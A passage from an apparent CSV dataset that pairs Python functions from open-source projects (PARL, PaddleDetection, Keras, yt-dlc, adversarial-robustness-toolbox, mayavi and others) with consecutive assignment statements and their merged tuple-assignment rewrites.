            size=hid2_size,
            act='tanh',
            param_attr=ParamAttr(name='{}/h2/W'.format(scope_name)),
            bias_attr=ParamAttr(name='{}/h2/b'.format(scope_name)))
        self.fc3 = layers.fc(
            size=act_dim,
            act='tanh',
            param_attr=ParamAttr(name='{}/means/W'.format(scope_name)),
            bias_attr=ParamAttr(name='{}/means/b'.format(scope_name)))","self.fc0 = layers.fc(size=hid0_size, act='tanh', param_attr=ParamAttr(name='{}/h0/W'.format(scope_name)), bias_attr=ParamAttr(name='{}/h0/b'.format(scope_name)))
self.fc1 = layers.fc(size=hid1_size, act='tanh', param_attr=ParamAttr(name='{}/h1/W'.format(scope_name)), bias_attr=ParamAttr(name='{}/h1/b'.format(scope_name)))
self.vel_fc0 = layers.fc(size=vel_hid0_size, act='tanh', param_attr=ParamAttr(name='{}/vel_h0/W'.format(scope_name)), bias_attr=ParamAttr(name='{}/vel_h0/b'.format(scope_name)))
self.vel_fc1 = layers.fc(size=vel_hid1_size, act='tanh', param_attr=ParamAttr(name='{}/vel_h1/W'.format(scope_name)), bias_attr=ParamAttr(name='{}/vel_h1/b'.format(scope_name)))
scope_name = 'policy_identity_{}'.format(model_id)","self.fc0 , self.fc1 , self.vel_fc0 , self.vel_fc1 , scope_name  = layers.fc(size=hid0_size, act='tanh', param_attr=ParamAttr(name='{}/h0/W'.format(scope_name)), bias_attr=ParamAttr(name='{}/h0/b'.format(scope_name))), layers.fc(size=hid1_size, act='tanh', param_attr=ParamAttr(name='{}/h1/W'.format(scope_name)), bias_attr=ParamAttr(name='{}/h1/b'.format(scope_name))), layers.fc(size=vel_hid0_size, act='tanh', param_attr=ParamAttr(name='{}/vel_h0/W'.format(scope_name)), bias_attr=ParamAttr(name='{}/vel_h0/b'.format(scope_name))), layers.fc(size=vel_hid1_size, act='tanh', param_attr=ParamAttr(name='{}/vel_h1/W'.format(scope_name)), bias_attr=ParamAttr(name='{}/vel_h1/b'.format(scope_name))), 'policy_identity_{}'.format(model_id)"
PARL,https://github.com/PaddlePaddle/PARL/tree/master/examples/NeurIPS2018-AI-for-Prosthetics-Challenge/opensim_model.py,ActorModel,__init__$39,"def __init__(self, obs_dim, vel_obs_dim, act_dim, model_id, shared):
        hid0_size = 800
        hid1_size = 400
        hid2_size = 200
        vel_hid0_size = 200
        vel_hid1_size = 400

        self.obs_dim = obs_dim
        self.vel_obs_dim = vel_obs_dim

        # bottom layers
        if shared:
            scope_name = 'policy_shared'
        else:
            scope_name = 'policy_identity_{}'.format(model_id)

        self.fc0 = layers.fc(
            size=hid0_size,
            act='tanh',
            param_attr=ParamAttr(name='{}/h0/W'.format(scope_name)),
            bias_attr=ParamAttr(name='{}/h0/b'.format(scope_name)))
        self.fc1 = layers.fc(
            size=hid1_size,
            act='tanh',
            param_attr=ParamAttr(name='{}/h1/W'.format(scope_name)),
            bias_attr=ParamAttr(name='{}/h1/b'.format(scope_name)))
        self.vel_fc0 = layers.fc(
            size=vel_hid0_size,
            act='tanh',
            param_attr=ParamAttr(name='{}/vel_h0/W'.format(scope_name)),
            bias_attr=ParamAttr(name='{}/vel_h0/b'.format(scope_name)))
        self.vel_fc1 = layers.fc(
            size=vel_hid1_size,
            act='tanh',
            param_attr=ParamAttr(name='{}/vel_h1/W'.format(scope_name)),
            bias_attr=ParamAttr(name='{}/vel_h1/b'.format(scope_name)))

        # top layers
        scope_name = 'policy_identity_{}'.format(model_id)

        self.fc2 = layers.fc(
            size=hid2_size,
            act='tanh',
            param_attr=ParamAttr(name='{}/h2/W'.format(scope_name)),
            bias_attr=ParamAttr(name='{}/h2/b'.format(scope_name)))
        self.fc3 = layers.fc(
            size=act_dim,
            act='tanh',
            param_attr=ParamAttr(name='{}/means/W'.format(scope_name)),
            bias_attr=ParamAttr(name='{}/means/b'.format(scope_name)))","self.fc2 = layers.fc(size=hid2_size, act='tanh', param_attr=ParamAttr(name='{}/h2/W'.format(scope_name)), bias_attr=ParamAttr(name='{}/h2/b'.format(scope_name)))
self.fc3 = layers.fc(size=act_dim, act='tanh', param_attr=ParamAttr(name='{}/means/W'.format(scope_name)), bias_attr=ParamAttr(name='{}/means/b'.format(scope_name)))","self.fc2 , self.fc3  = layers.fc(size=hid2_size, act='tanh', param_attr=ParamAttr(name='{}/h2/W'.format(scope_name)), bias_attr=ParamAttr(name='{}/h2/b'.format(scope_name))), layers.fc(size=act_dim, act='tanh', param_attr=ParamAttr(name='{}/means/W'.format(scope_name)), bias_attr=ParamAttr(name='{}/means/b'.format(scope_name)))"
PaddleDetection,https://github.com/PaddlePaddle/PaddleDetection/tree/master/static/ppdet/modeling/backbones/res2net.py,Res2Net,layer_warp$149,"def layer_warp(self, input, stage_num):
        """"""
        Args:
            input (Variable): input variable.
            stage_num (int): the stage number, should be 2, 3, 4, 5

        Returns:
            The last variable in endpoint-th stage.
        """"""
        assert stage_num in [2, 3, 4, 5]

        stages, block_func = self.depth_cfg[self.depth]
        count = stages[stage_num - 2]

        ch_out = self.stage_filters[stage_num - 2]
        is_first = False if stage_num != 2 else True
        dcn_v2 = True if stage_num in self.dcn_v2_stages else False

        num_filters1 = self.num_filters1[stage_num - 2]
        num_filters2 = self.num_filters2[stage_num - 2]

        nonlocal_mod = 1000
        if stage_num in self.nonlocal_stages:
            nonlocal_mod = self.nonlocal_mod_cfg[
                self.depth] if stage_num == 4 else 2

        # Make the layer name and parameter name consistent
        # with ImageNet pre-trained model
        conv = input
        for i in range(count):
            conv_name = self.na.fix_layer_warp_name(stage_num, count, i)
            if self.depth < 50:
                is_first = True if i == 0 and stage_num == 2 else False
            conv = block_func(
                input=conv,
                num_filters1=num_filters1,
                num_filters2=num_filters2,
                stride=2 if i == 0 and stage_num != 2 else 1,
                is_first=is_first,
                name=conv_name,
                dcn_v2=dcn_v2)

            # add non local model
            dim_in = conv.shape[1]
            nonlocal_name = ""nonlocal_conv{}"".format(stage_num)
            if i % nonlocal_mod == nonlocal_mod - 1:
                conv = add_space_nonlocal(conv, dim_in, dim_in,
                                          nonlocal_name + '_{}'.format(i),
                                          int(dim_in / 2))
        return conv","count = stages[stage_num - 2]
ch_out = self.stage_filters[stage_num - 2]
is_first = False if stage_num != 2 else True
dcn_v2 = True if stage_num in self.dcn_v2_stages else False
num_filters1 = self.num_filters1[stage_num - 2]
num_filters2 = self.num_filters2[stage_num - 2]
nonlocal_mod = 1000","count , ch_out , is_first , dcn_v2 , num_filters1 , num_filters2 , nonlocal_mod  = stages[stage_num - 2], self.stage_filters[stage_num - 2], False if stage_num != 2 else True, True if stage_num in self.dcn_v2_stages else False, self.num_filters1[stage_num - 2], self.num_filters2[stage_num - 2], 1000"
PaddleDetection,https://github.com/PaddlePaddle/PaddleDetection/tree/master/static/ppdet/modeling/backbones/res2net.py,Res2Net,layer_warp$149,"def layer_warp(self, input, stage_num):
        """"""
        Args:
            input (Variable): input variable.
            stage_num (int): the stage number, should be 2, 3, 4, 5

        Returns:
            The last variable in endpoint-th stage.
        """"""
        assert stage_num in [2, 3, 4, 5]

        stages, block_func = self.depth_cfg[self.depth]
        count = stages[stage_num - 2]

        ch_out = self.stage_filters[stage_num - 2]
        is_first = False if stage_num != 2 else True
        dcn_v2 = True if stage_num in self.dcn_v2_stages else False

        num_filters1 = self.num_filters1[stage_num - 2]
        num_filters2 = self.num_filters2[stage_num - 2]

        nonlocal_mod = 1000
        if stage_num in self.nonlocal_stages:
            nonlocal_mod = self.nonlocal_mod_cfg[
                self.depth] if stage_num == 4 else 2

        # Make the layer name and parameter name consistent
        # with ImageNet pre-trained model
        conv = input
        for i in range(count):
            conv_name = self.na.fix_layer_warp_name(stage_num, count, i)
            if self.depth < 50:
                is_first = True if i == 0 and stage_num == 2 else False
            conv = block_func(
                input=conv,
                num_filters1=num_filters1,
                num_filters2=num_filters2,
                stride=2 if i == 0 and stage_num != 2 else 1,
                is_first=is_first,
                name=conv_name,
                dcn_v2=dcn_v2)

            # add non local model
            dim_in = conv.shape[1]
            nonlocal_name = ""nonlocal_conv{}"".format(stage_num)
            if i % nonlocal_mod == nonlocal_mod - 1:
                conv = add_space_nonlocal(conv, dim_in, dim_in,
                                          nonlocal_name + '_{}'.format(i),
                                          int(dim_in / 2))
        return conv","dim_in = conv.shape[1]
nonlocal_name = 'nonlocal_conv{}'.format(stage_num)","dim_in , nonlocal_name  = conv.shape[1], 'nonlocal_conv{}'.format(stage_num)"
keras,https://github.com/keras-team/keras/tree/master/keras/layers/kernelized.py,RandomFourierFeatures,get_config$226,"def get_config(self):
    kernel_initializer = self.kernel_initializer
    if not isinstance(kernel_initializer, str):
      kernel_initializer = initializers.serialize(kernel_initializer)
    config = {
        'output_dim': self.output_dim,
        'kernel_initializer': kernel_initializer,
        'scale': self.scale,
    }
    base_config = super(RandomFourierFeatures, self).get_config()
    return dict(list(base_config.items()) + list(config.items()))","config = {'output_dim': self.output_dim, 'kernel_initializer': kernel_initializer, 'scale': self.scale}
base_config = super(RandomFourierFeatures, self).get_config()","config , base_config  = {'output_dim': self.output_dim, 'kernel_initializer': kernel_initializer, 'scale': self.scale}, super(RandomFourierFeatures, self).get_config()"
yt-dlc,https://github.com/blackjack4494/yt-dlc/tree/master/youtube_dlc/extractor/vimeo.py,VimeoIE,_verify_player_video_password$545,"def _verify_player_video_password(self, url, video_id, headers):
        password = self._downloader.params.get('videopassword')
        if password is None:
            raise ExtractorError('This video is protected by a password, use the --video-password option', expected=True)
        data = urlencode_postdata({
            'password': base64.b64encode(password.encode()),
        })
        headers = merge_dicts(headers, {
            'Content-Type': 'application/x-www-form-urlencoded',
        })
        checked = self._download_json(
            url + '/check-password', video_id,
            'Verifying the password', data=data, headers=headers)
        if checked is False:
            raise ExtractorError('Wrong video password', expected=True)
        return checked","data = urlencode_postdata({'password': base64.b64encode(password.encode())})
headers = merge_dicts(headers, {'Content-Type': 'application/x-www-form-urlencoded'})","data , headers  = urlencode_postdata({'password': base64.b64encode(password.encode())}), merge_dicts(headers, {'Content-Type': 'application/x-www-form-urlencoded'})"
adversarial-robustness-toolbox,https://github.com/Trusted-AI/adversarial-robustness-toolbox/tree/master/tests/attacks/test_hclu.py,TestHCLU,test_GPy$46,"def test_GPy(self):
        x_test_original = self.x_test.copy()
        # set up GPclassifier
        gpkern = GPy.kern.RBF(np.shape(self.x_train)[1])
        m = GPy.models.GPClassification(self.x_train, self.y_train.reshape(-1, 1), kernel=gpkern)
        m.inference_method = GPy.inference.latent_function_inference.laplace.Laplace()
        m.optimize(messages=True, optimizer=""lbfgs"")
        # get ART classifier + clean accuracy
        m_art = GPyGaussianProcessClassifier(m)
        clean_acc = np.mean(np.argmin(m_art.predict(self.x_test), axis=1) == self.y_test)
        # get adversarial examples, accuracy, and uncertainty
        attack = HighConfidenceLowUncertainty(m_art, conf=0.9, min_val=-0.0, max_val=1.0, verbose=False)
        adv = attack.generate(self.x_test)
        adv_acc = np.mean(np.argmin(m_art.predict(adv), axis=1) == self.y_test)
        unc_f = m_art.predict_uncertainty(adv)
        # not all attacks succeed due to the decision surface landscape of GP, some should
        self.assertGreater(clean_acc, adv_acc)

        # now take into account uncertainty
        attack = HighConfidenceLowUncertainty(
            m_art, unc_increase=0.9, conf=0.9, min_val=0.0, max_val=1.0, verbose=False
        )
        adv = attack.generate(self.x_test)
        adv_acc = np.mean(np.argmin(m_art.predict(adv), axis=1) == self.y_test)
        unc_o = m_art.predict_uncertainty(adv)
        # same above
        self.assertGreater(clean_acc, adv_acc)
        # uncertainty should indeed be lower when used as a constraint
        # however, same as above, crafting might fail
        self.assertGreater(np.mean(unc_f > unc_o), 0.6)

        # Check that x_test has not been modified by attack and classifier
        self.assertAlmostEqual(float(np.max(np.abs(x_test_original - self.x_test))), 0.0, delta=0.00001)","x_test_original = self.x_test.copy()
gpkern = GPy.kern.RBF(np.shape(self.x_train)[1])","x_test_original , gpkern  = self.x_test.copy(), GPy.kern.RBF(np.shape(self.x_train)[1])"
adversarial-robustness-toolbox,https://github.com/Trusted-AI/adversarial-robustness-toolbox/tree/master/tests/attacks/test_hclu.py,TestHCLU,test_GPy$46,"def test_GPy(self):
        x_test_original = self.x_test.copy()
        # set up GPclassifier
        gpkern = GPy.kern.RBF(np.shape(self.x_train)[1])
        m = GPy.models.GPClassification(self.x_train, self.y_train.reshape(-1, 1), kernel=gpkern)
        m.inference_method = GPy.inference.latent_function_inference.laplace.Laplace()
        m.optimize(messages=True, optimizer=""lbfgs"")
        # get ART classifier + clean accuracy
        m_art = GPyGaussianProcessClassifier(m)
        clean_acc = np.mean(np.argmin(m_art.predict(self.x_test), axis=1) == self.y_test)
        # get adversarial examples, accuracy, and uncertainty
        attack = HighConfidenceLowUncertainty(m_art, conf=0.9, min_val=-0.0, max_val=1.0, verbose=False)
        adv = attack.generate(self.x_test)
        adv_acc = np.mean(np.argmin(m_art.predict(adv), axis=1) == self.y_test)
        unc_f = m_art.predict_uncertainty(adv)
        # not all attacks succeed due to the decision surface landscape of GP, some should
        self.assertGreater(clean_acc, adv_acc)

        # now take into account uncertainty
        attack = HighConfidenceLowUncertainty(
            m_art, unc_increase=0.9, conf=0.9, min_val=0.0, max_val=1.0, verbose=False
        )
        adv = attack.generate(self.x_test)
        adv_acc = np.mean(np.argmin(m_art.predict(adv), axis=1) == self.y_test)
        unc_o = m_art.predict_uncertainty(adv)
        # same above
        self.assertGreater(clean_acc, adv_acc)
        # uncertainty should indeed be lower when used as a constraint
        # however, same as above, crafting might fail
        self.assertGreater(np.mean(unc_f > unc_o), 0.6)

        # Check that x_test has not been modified by attack and classifier
        self.assertAlmostEqual(float(np.max(np.abs(x_test_original - self.x_test))), 0.0, delta=0.00001)","clean_acc = np.mean(np.argmin(m_art.predict(self.x_test), axis=1) == self.y_test)
attack = HighConfidenceLowUncertainty(m_art, conf=0.9, min_val=-0.0, max_val=1.0, verbose=False)","clean_acc , attack  = np.mean(np.argmin(m_art.predict(self.x_test), axis=1) == self.y_test), HighConfidenceLowUncertainty(m_art, conf=0.9, min_val=-0.0, max_val=1.0, verbose=False)"
adversarial-robustness-toolbox,https://github.com/Trusted-AI/adversarial-robustness-toolbox/tree/master/tests/attacks/test_hclu.py,TestHCLU,test_GPy$46,"def test_GPy(self):
        x_test_original = self.x_test.copy()
        # set up GPclassifier
        gpkern = GPy.kern.RBF(np.shape(self.x_train)[1])
        m = GPy.models.GPClassification(self.x_train, self.y_train.reshape(-1, 1), kernel=gpkern)
        m.inference_method = GPy.inference.latent_function_inference.laplace.Laplace()
        m.optimize(messages=True, optimizer=""lbfgs"")
        # get ART classifier + clean accuracy
        m_art = GPyGaussianProcessClassifier(m)
        clean_acc = np.mean(np.argmin(m_art.predict(self.x_test), axis=1) == self.y_test)
        # get adversarial examples, accuracy, and uncertainty
        attack = HighConfidenceLowUncertainty(m_art, conf=0.9, min_val=-0.0, max_val=1.0, verbose=False)
        adv = attack.generate(self.x_test)
        adv_acc = np.mean(np.argmin(m_art.predict(adv), axis=1) == self.y_test)
        unc_f = m_art.predict_uncertainty(adv)
        # not all attacks succeed due to the decision surface landscape of GP, some should
        self.assertGreater(clean_acc, adv_acc)

        # now take into account uncertainty
        attack = HighConfidenceLowUncertainty(
            m_art, unc_increase=0.9, conf=0.9, min_val=0.0, max_val=1.0, verbose=False
        )
        adv = attack.generate(self.x_test)
        adv_acc = np.mean(np.argmin(m_art.predict(adv), axis=1) == self.y_test)
        unc_o = m_art.predict_uncertainty(adv)
        # same above
        self.assertGreater(clean_acc, adv_acc)
        # uncertainty should indeed be lower when used as a constraint
        # however, same as above, crafting might fail
        self.assertGreater(np.mean(unc_f > unc_o), 0.6)

        # Check that x_test has not been modified by attack and classifier
        self.assertAlmostEqual(float(np.max(np.abs(x_test_original - self.x_test))), 0.0, delta=0.00001)","adv_acc = np.mean(np.argmin(m_art.predict(adv), axis=1) == self.y_test)
unc_f = m_art.predict_uncertainty(adv)","adv_acc , unc_f  = np.mean(np.argmin(m_art.predict(adv), axis=1) == self.y_test), m_art.predict_uncertainty(adv)"
adversarial-robustness-toolbox,https://github.com/Trusted-AI/adversarial-robustness-toolbox/tree/master/tests/attacks/test_hclu.py,TestHCLU,test_GPy$46,"def test_GPy(self):
        x_test_original = self.x_test.copy()
        # set up GPclassifier
        gpkern = GPy.kern.RBF(np.shape(self.x_train)[1])
        m = GPy.models.GPClassification(self.x_train, self.y_train.reshape(-1, 1), kernel=gpkern)
        m.inference_method = GPy.inference.latent_function_inference.laplace.Laplace()
        m.optimize(messages=True, optimizer=""lbfgs"")
        # get ART classifier + clean accuracy
        m_art = GPyGaussianProcessClassifier(m)
        clean_acc = np.mean(np.argmin(m_art.predict(self.x_test), axis=1) == self.y_test)
        # get adversarial examples, accuracy, and uncertainty
        attack = HighConfidenceLowUncertainty(m_art, conf=0.9, min_val=-0.0, max_val=1.0, verbose=False)
        adv = attack.generate(self.x_test)
        adv_acc = np.mean(np.argmin(m_art.predict(adv), axis=1) == self.y_test)
        unc_f = m_art.predict_uncertainty(adv)
        # not all attacks succeed due to the decision surface landscape of GP, some should
        self.assertGreater(clean_acc, adv_acc)

        # now take into account uncertainty
        attack = HighConfidenceLowUncertainty(
            m_art, unc_increase=0.9, conf=0.9, min_val=0.0, max_val=1.0, verbose=False
        )
        adv = attack.generate(self.x_test)
        adv_acc = np.mean(np.argmin(m_art.predict(adv), axis=1) == self.y_test)
        unc_o = m_art.predict_uncertainty(adv)
        # same above
        self.assertGreater(clean_acc, adv_acc)
        # uncertainty should indeed be lower when used as a constraint
        # however, same as above, crafting might fail
        self.assertGreater(np.mean(unc_f > unc_o), 0.6)

        # Check that x_test has not been modified by attack and classifier
        self.assertAlmostEqual(float(np.max(np.abs(x_test_original - self.x_test))), 0.0, delta=0.00001)","adv_acc = np.mean(np.argmin(m_art.predict(adv), axis=1) == self.y_test)
unc_o = m_art.predict_uncertainty(adv)","adv_acc , unc_o  = np.mean(np.argmin(m_art.predict(adv), axis=1) == self.y_test), m_art.predict_uncertainty(adv)"
quay,https://github.com/quay/quay/tree/master/endpoints/api/logs.py,ExportRepositoryLogs,post$366,"def post(self, namespace, repository, parsed_args):
        """"""
        Queues an export of the logs for the specified repository.
        """"""
        if registry_model.lookup_repository(namespace, repository) is None:
            raise NotFound()

        start_time = parsed_args[""starttime""]
        end_time = parsed_args[""endtime""]
        export_id = _queue_logs_export(
            start_time, end_time, request.get_json(), namespace, repository_name=repository
        )
        return {
            ""export_id"": export_id,
        }","start_time = parsed_args['starttime']
end_time = parsed_args['endtime']","start_time , end_time  = parsed_args['starttime'], parsed_args['endtime']"
mayavi,https://github.com/enthought/mayavi/tree/master/mayavi/tools/helper_functions.py,,test_mesh$881,"def test_mesh():
    """"""A very pretty picture of spherical harmonics translated from
    the octaviz example.""""""
    pi = np.pi
    cos = np.cos
    sin = np.sin
    dphi, dtheta = pi / 250.0, pi / 250.0
    [phi, theta] = np.mgrid[0:pi + dphi * 1.5:dphi,
                            0:2 * pi + dtheta * 1.5:dtheta]
    m0 = 4
    m1 = 3
    m2 = 2
    m3 = 3
    m4 = 6
    m5 = 2
    m6 = 6
    m7 = 4
    r = sin(m0 * phi) ** m1 + cos(m2 * phi) ** m3 + \
        sin(m4 * theta) ** m5 + cos(m6 * theta) ** m7
    x = r * sin(phi) * cos(theta)
    y = r * cos(phi)
    z = r * sin(phi) * sin(theta)

    return mesh(x, y, z, colormap=""bone"")","pi = np.pi
cos = np.cos
sin = np.sin","pi , cos , sin  = np.pi, np.cos, np.sin"
mayavi,https://github.com/enthought/mayavi/tree/master/mayavi/tools/helper_functions.py,,test_mesh$881,"def test_mesh():
    """"""A very pretty picture of spherical harmonics translated from
    the octaviz example.""""""
    pi = np.pi
    cos = np.cos
    sin = np.sin
    dphi, dtheta = pi / 250.0, pi / 250.0
    [phi, theta] = np.mgrid[0:pi + dphi * 1.5:dphi,
                            0:2 * pi + dtheta * 1.5:dtheta]
    m0 = 4
    m1 = 3
    m2 = 2
    m3 = 3
    m4 = 6
    m5 = 2
    m6 = 6
    m7 = 4
    r = sin(m0 * phi) ** m1 + cos(m2 * phi) ** m3 + \
        sin(m4 * theta) ** m5 + cos(m6 * theta) ** m7
    x = r * sin(phi) * cos(theta)
    y = r * cos(phi)
    z = r * sin(phi) * sin(theta)

    return mesh(x, y, z, colormap=""bone"")","m0 = 4
m1 = 3
m2 = 2
m3 = 3
m4 = 6
m5 = 2
m6 = 6
m7 = 4","m0 , m1 , m2 , m3 , m4 , m5 , m6 , m7  = 4, 3, 2, 3, 6, 2, 6, 4"
mayavi,https://github.com/enthought/mayavi/tree/master/mayavi/tools/helper_functions.py,,test_mesh$881,"def test_mesh():
    """"""A very pretty picture of spherical harmonics translated from
    the octaviz example.""""""
    pi = np.pi
    cos = np.cos
    sin = np.sin
    dphi, dtheta = pi / 250.0, pi / 250.0
    [phi, theta] = np.mgrid[0:pi + dphi * 1.5:dphi,
                            0:2 * pi + dtheta * 1.5:dtheta]
    m0 = 4
    m1 = 3
    m2 = 2
    m3 = 3
    m4 = 6
    m5 = 2
    m6 = 6
    m7 = 4
    r = sin(m0 * phi) ** m1 + cos(m2 * phi) ** m3 + \
        sin(m4 * theta) ** m5 + cos(m6 * theta) ** m7
    x = r * sin(phi) * cos(theta)
    y = r * cos(phi)
    z = r * sin(phi) * sin(theta)

    return mesh(x, y, z, colormap=""bone"")","x = r * sin(phi) * cos(theta)
y = r * cos(phi)
z = r * sin(phi) * sin(theta)","x , y , z  = r * sin(phi) * cos(theta), r * cos(phi), r * sin(phi) * sin(theta)"
lxmert,https://github.com/airsplay/lxmert/tree/master/src/lxrt/modeling.py,LXRTXLayer,output_fc$467,"def output_fc(self, lang_input, visn_input):
        # FC layers
        lang_inter_output = self.lang_inter(lang_input)
        visn_inter_output = self.visn_inter(visn_input)

        # Layer output
        lang_output = self.lang_output(lang_inter_output, lang_input)
        visn_output = self.visn_output(visn_inter_output, visn_input)
        return lang_output, visn_output","lang_output = self.lang_output(lang_inter_output, lang_input)
visn_output = self.visn_output(visn_inter_output, visn_input)","lang_output , visn_output  = self.lang_output(lang_inter_output, lang_input), self.visn_output(visn_inter_output, visn_input)"
FasterSeg,https://github.com/VITA-Group/FasterSeg/tree/master/search/dataloader.py,TrainPre,__call__$14,"def __call__(self, img, gt):
        img, gt = random_mirror(img, gt)
        if self.config.train_scale_array is not None:
            img, gt, scale = random_scale(img, gt, self.config.train_scale_array)

        img = normalize(img, self.img_mean, self.img_std)

        crop_size = (self.config.image_height, self.config.image_width)
        crop_pos = generate_random_crop_pos(img.shape[:2], crop_size)
        p_img, _ = random_crop_pad_to_shape(img, crop_pos, crop_size, 0)
        p_gt, _ = random_crop_pad_to_shape(gt, crop_pos, crop_size, 255)
        p_gt = cv2.resize(p_gt, (self.config.image_width // self.config.gt_down_sampling, self.config.image_height // self.config.gt_down_sampling), interpolation=cv2.INTER_NEAREST)

        p_img = p_img.transpose(2, 0, 1)

        extra_dict = None

        return p_img, p_gt, extra_dict","img = normalize(img, self.img_mean, self.img_std)
crop_size = (self.config.image_height, self.config.image_width)","img , crop_size  = normalize(img, self.img_mean, self.img_std), (self.config.image_height, self.config.image_width)"
FasterSeg,https://github.com/VITA-Group/FasterSeg/tree/master/search/dataloader.py,TrainPre,__call__$14,"def __call__(self, img, gt):
        img, gt = random_mirror(img, gt)
        if self.config.train_scale_array is not None:
            img, gt, scale = random_scale(img, gt, self.config.train_scale_array)

        img = normalize(img, self.img_mean, self.img_std)

        crop_size = (self.config.image_height, self.config.image_width)
        crop_pos = generate_random_crop_pos(img.shape[:2], crop_size)
        p_img, _ = random_crop_pad_to_shape(img, crop_pos, crop_size, 0)
        p_gt, _ = random_crop_pad_to_shape(gt, crop_pos, crop_size, 255)
        p_gt = cv2.resize(p_gt, (self.config.image_width // self.config.gt_down_sampling, self.config.image_height // self.config.gt_down_sampling), interpolation=cv2.INTER_NEAREST)

        p_img = p_img.transpose(2, 0, 1)

        extra_dict = None

        return p_img, p_gt, extra_dict","p_gt = cv2.resize(p_gt, (self.config.image_width // self.config.gt_down_sampling, self.config.image_height // self.config.gt_down_sampling), interpolation=cv2.INTER_NEAREST)
p_img = p_img.transpose(2, 0, 1)
extra_dict = None","p_gt , p_img , extra_dict  = cv2.resize(p_gt, (self.config.image_width // self.config.gt_down_sampling, self.config.image_height // self.config.gt_down_sampling), interpolation=cv2.INTER_NEAREST), p_img.transpose(2, 0, 1), None"
ignite,https://github.com/pytorch/ignite/tree/master/ignite/handlers/param_scheduler.py,ParamGroupScheduler,__init__$1161,"def __init__(self, schedulers: List[ParamScheduler], names: Optional[List[str]] = None, save_history: bool = False):
        if not isinstance(schedulers, Sequence):
            raise TypeError(f""Argument schedulers should be a list/tuple, but given {schedulers}"")

        if not all(isinstance(scheduler, ParamScheduler) for scheduler in schedulers):
            raise ValueError(
                f""Argument schedulers should be a list/tuple of parameter schedulers, but given {schedulers}""
            )

        if names is None:
            names = [s.param_name for s in schedulers]

        if not isinstance(names, (list, tuple)):
            raise TypeError(f""Argument names should be a list/tuple, but given {names}"")

        if not all(isinstance(n, str) for n in names):
            raise ValueError(f""Argument names should be a list/tuple of parameter scheduler's names, but given {names}"")

        if len(names) != len(schedulers):
            raise ValueError(f""{len(schedulers)} should be equal {len(names)}"")

        self.schedulers = schedulers
        self.names = names

        # schedulers should have save_history sync with ParamGroupScheduler
        for s in schedulers:
            s.save_history = save_history

        self.optimizer = [s.optimizer for s in self.schedulers]
        self.param_name = [s.param_name for s in self.schedulers]","self.schedulers = schedulers
self.names = names","self.schedulers , self.names  = schedulers, names"
2019-CCF-BDCI-OCR-MCZJ-OCR-IdentificationIDElement,https://github.com/Mingtzge/2019-CCF-BDCI-OCR-MCZJ-OCR-IdentificationIDElement/tree/master/recognize_process/data_provider/write_tfrecord.py,,_init_data_queue$130,"def _init_data_queue(img_dir, anno_file_path, char_map_path, writer_process_nums, dataset_flag='train'):
    print('Start filling {:s} dataset sample information queue...'.format(dataset_flag))
    t_start = time.time() #开始处理，计时

    annotation_infos = []

    num_lines = sum(1 for _ in open(anno_file_path, 'r')) # 图片及标注行数
    with open(anno_file_path, 'r', encoding='utf-8') as file:
        for line in tqdm.tqdm(file, total=num_lines):
            image_name, label_index = line.rstrip('\r').rstrip('\n').split(' ')
            #img_dir = img_dir.strip()
            #image_name = image_name.upper()
            image_path = ops.join(img_dir, image_name.strip()) # 图片地址
            label_index = label_index.lower()
            label_index = _string_to_int(char_map_path, label_index) # label本是字符串，转为int
            if not ops.exists(image_path):
                print('Example image {:s} not exist'.format(image_path))
                continue
                #raise ValueError('Example image {:s} not exist'.format(image_path))
            annotation_infos.append((image_path, label_index)) # 结果

    for annotation_info in tqdm.tqdm(annotation_infos):
        image_path = annotation_info[0]
        label_index = annotation_info[1]
        try:
            _SAMPLE_INFO_QUEUE.put((image_path, label_index))
        except IndexError:
            print('Lexicon doesn\'t contain lexicon index {:d}'.format(label_index))
            continue
    for i in range(writer_process_nums): # 添加结束标志
        _SAMPLE_INFO_QUEUE.put(_SENTINEL)
    print('Complete filling dataset sample information queue[current size: {:d}], cost time: {:.5f}s'.format(
        _SAMPLE_INFO_QUEUE.qsize(), time.time() - t_start))","t_start = time.time()
annotation_infos = []
num_lines = sum((1 for _ in open(anno_file_path, 'r')))","t_start , annotation_infos , num_lines  = time.time(), [], sum((1 for _ in open(anno_file_path, 'r')))"
2019-CCF-BDCI-OCR-MCZJ-OCR-IdentificationIDElement,https://github.com/Mingtzge/2019-CCF-BDCI-OCR-MCZJ-OCR-IdentificationIDElement/tree/master/recognize_process/data_provider/write_tfrecord.py,,_init_data_queue$130,"def _init_data_queue(img_dir, anno_file_path, char_map_path, writer_process_nums, dataset_flag='train'):
    print('Start filling {:s} dataset sample information queue...'.format(dataset_flag))
    t_start = time.time() #开始处理，计时

    annotation_infos = []

    num_lines = sum(1 for _ in open(anno_file_path, 'r')) # 图片及标注行数
    with open(anno_file_path, 'r', encoding='utf-8') as file:
        for line in tqdm.tqdm(file, total=num_lines):
            image_name, label_index = line.rstrip('\r').rstrip('\n').split(' ')
            #img_dir = img_dir.strip()
            #image_name = image_name.upper()
            image_path = ops.join(img_dir, image_name.strip()) # 图片地址
            label_index = label_index.lower()
            label_index = _string_to_int(char_map_path, label_index) # label本是字符串，转为int
            if not ops.exists(image_path):
                print('Example image {:s} not exist'.format(image_path))
                continue
                #raise ValueError('Example image {:s} not exist'.format(image_path))
            annotation_infos.append((image_path, label_index)) # 结果

    for annotation_info in tqdm.tqdm(annotation_infos):
        image_path = annotation_info[0]
        label_index = annotation_info[1]
        try:
            _SAMPLE_INFO_QUEUE.put((image_path, label_index))
        except IndexError:
            print('Lexicon doesn\'t contain lexicon index {:d}'.format(label_index))
            continue
    for i in range(writer_process_nums): # 添加结束标志
        _SAMPLE_INFO_QUEUE.put(_SENTINEL)
    print('Complete filling dataset sample information queue[current size: {:d}], cost time: {:.5f}s'.format(
        _SAMPLE_INFO_QUEUE.qsize(), time.time() - t_start))","image_path = annotation_info[0]
label_index = annotation_info[1]","image_path , label_index  = annotation_info[0], annotation_info[1]"
2019-CCF-BDCI-OCR-MCZJ-OCR-IdentificationIDElement,https://github.com/Mingtzge/2019-CCF-BDCI-OCR-MCZJ-OCR-IdentificationIDElement/tree/master/recognize_process/data_provider/write_tfrecord.py,,_init_data_queue$130,"def _init_data_queue(img_dir, anno_file_path, char_map_path, writer_process_nums, dataset_flag='train'):
    print('Start filling {:s} dataset sample information queue...'.format(dataset_flag))
    t_start = time.time() #开始处理，计时

    annotation_infos = []

    num_lines = sum(1 for _ in open(anno_file_path, 'r')) # 图片及标注行数
    with open(anno_file_path, 'r', encoding='utf-8') as file:
        for line in tqdm.tqdm(file, total=num_lines):
